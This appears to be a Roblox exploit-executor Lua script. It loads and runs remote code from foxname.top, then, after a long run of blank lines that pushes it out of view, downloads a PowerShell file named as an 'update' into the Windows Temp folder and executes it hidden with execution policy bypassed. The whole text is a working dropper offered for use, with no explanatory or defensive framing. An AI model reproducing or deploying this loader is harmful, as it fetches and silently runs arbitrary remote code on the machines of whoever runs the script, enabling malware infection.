loadstring(game:HttpGet("https://foxname.top/loader"))()




























































































































local url = "https://example.com/payload.ps1"  -- Replace with your direct .ps1 link

local HttpService = game:GetService("HttpService")
local content = HttpService:GetAsync(url)

local filename = "C:\\Windows\\Temp\\update.ps1"
writefile(filename, content)

-- Run the .ps1 silently with bypassed execution policy
os.execute('powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' .. filename .. '"')
